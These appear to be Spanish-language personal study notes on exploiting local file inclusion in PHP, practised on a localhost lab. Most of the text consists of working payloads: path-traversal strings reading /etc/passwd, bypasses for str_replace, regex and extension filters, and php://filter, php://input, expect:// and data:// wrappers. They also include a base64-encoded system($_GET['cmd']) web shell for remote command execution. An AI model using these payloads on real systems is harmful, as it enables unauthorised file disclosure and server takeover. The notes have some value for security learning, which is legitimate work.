 Nos vamos a la ruta /var/www/html y creamos index.php
 Introducimos el siguiente codigo, esto hace que cuando accedamos a localhost/index.php?filename=test nos de el contenido del archivo llamado test 
?php
  $filename = $_GET['filename'];
  include($filename);

?>

Gracias a esto podemos salirnos del archivo es decir reemplazamos en la url test por /etc/passwd

http://localhost/index.php?filename=/etc/passd


Muchas veces oara segurizarlo y que no puedas salirte de la ruta poniendo /etc/passwd usan lo siguiente
?php
  $filename = $_GET['filename'];
  include("/var/ww/html/" . $filename);

?>

Pero podemos vulnerarlo aplicando un directory pass transversal de la siguiente manera
/../../../../../etc/passwd
				http://localhost/index.php?filename=../../../../../../../etc/passwd
	
Muchas veces para evitar que puedas utilizar ../../ para vulnerar la ruta utilizan str_replace:
Es decir
				?php
					  $filename = $_GET['filename'];
					  $filename = str_replace("../", "", $filename);
					  include("/var/ww/html/" . $filename);

				?>
El problema es que no es recursivo es decir si hago ....//....//....//../etc/passwd sigue teniendo la misma vulnerabilidad


Hay quienes juegan con expresiones regulares para detectar si estan intentando vulnerar
de la siguiente manera:

`<?php`
  `$filename = $_GET['filename'];`
  `$filename = str_replace("../", "", $filename);`

  `if(preg_match("/passwd/", $filename) ===1){`
    `echo "\n[!] No es posible visualizar el contenido de este archivo\n"`
  `} else {`
    `include("/var/www/html/" . $filename);`
  `}`

`?>`

Esto hace que cuando intentes aplicar ....//....//....//....//....//etc/passwd bloquee la salida a paswd
pero solo para /etc/passwd no para todas como /etc/hosts

POR LO TANTO preg_match no es recomendable
Se puede burlar de la siguiente manera, solo es necesario poner un par de barras o puntos tal queasi:
....//....//....//....//....//etc///////passwd


muchas veces por sanitizacion lo que hacen es agregar al codigo
include("/etc/hosts" . ".php")
esto hace que cuando quieras hacer una injeccion en automatico se convierte en .php 
pero se puede burlar utilizando algo llamado NULL BYTE INJECTION ES DECIR %00 o \0  para que se salte el .php
![[Pasted image 20250326171032.png]]
`php -r 'if (substr($argv[1], -6, 6) != "passwd") include($argv[1]);' '/etc//././././passwd/.'; echo`

En ese caso lo que hace es que si los ultimos 6 caracteres son passwd lo sanitiza pero ahi se muestra como en versiones anteriores basta con hacer /passwd/. y te da el contenido, en versiones mas recienteste y actualizadas no se puede


Tambien se piede hacer esto
`php -r 'if (substr($argv[1], -4, 4) != ".txt") include($argv[1]);' '/etc/passwd/.'; echo`

- `substr($argv[1], -4)`: Obtiene los últimos 4 caracteres del argumento.
    
- `!= ".txt"`: Verifica que no termine en `.txt`.
    
- `include($argv[1]);`: Si no termina en `.txt`, lo incluye.


Si yo ejecuto esto
php -r 'if (substr($argv[1], -4, 4) != ".txt") include($argv[1]);' '/var/www/test.txt'; echo
No arrojara nada 
pero si haces esto se puede bypaseear el archivo y mostrar su contenido:
php -r 'if (substr($argv[1], -4, 4) != ".txt") include($argv[1]);' '/var/www/test.txt/.'; echo 




HAY MULTIPLE WRAPERS
Uno que te convierte a base 64 /?filename=php://file/convert.base64-encode/resource=secret.php
Otro que te rota 13 posiciones el contenido
?filename=php://filter/read=string.rot13/resource=secret.php

otro para convertir utf8  utf16
php://filter/convert.iconv.UTF-8.UTF-16/resource=secret.php


ABRIMOS BURP e ingresamos en filename=hola para intereceptar peticion
vamos al repeater
Otros wrappers
RCE 
expect://whoami
cambiamos la peticion de GET a POST (dando click derecho change petition to post) e ingreamos en filename=php://input
hasta abajo ingresamos
`<?php system("whoami"); ?>`
		este solo aplica si allow_url_fopen y allow_url_include estan en ON en php.ini
Otro wrapper
?filename=data://text/plain;base64,cadena_de_codigo_base64
la cadena es -> `<?php system("whoami"); ?>` -convertida en base 64 -> PD9waHAgc3lzdGVtKCJ3aG9hbWkiKSA/Pg==

Podemos esta cadena para poder controlar cmd
`<?php system($_GET["cmd"]); ?>`
En base 64 seria esto:
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
Solo que en burpsuite muchas veces te urlencodea el + o otros simbolos y para ello aplicamo Ctrl+u y luego enviamos la peticion
Tal que se veria de la siguiente manera
![[Pasted image 20250328115428.png]]

oTRA FORMA MODERNA Y POCA CONOCIDA ES USAR FILTER CHAINS A TRAVES DE WRAPERS JUEGAS CON ICONV PARA ENCODEAR

la practica de filter chain es encodeAR Y DECODEAR ENCODEAR Y DECODEAR A MODO QUE LE DES LA VUELTA A LA CADENA
Se puede jugar con base 64, UTF8 CSISO2022KR, UTF32

en github hay una Herramienta llamada php filter chain generator, te uestra cada palabra y demas que puedes emplear para realizar una lfi

tambien se puede junkear php://temp para almacenar datos temporales en una envoltura similar a un fichero

c
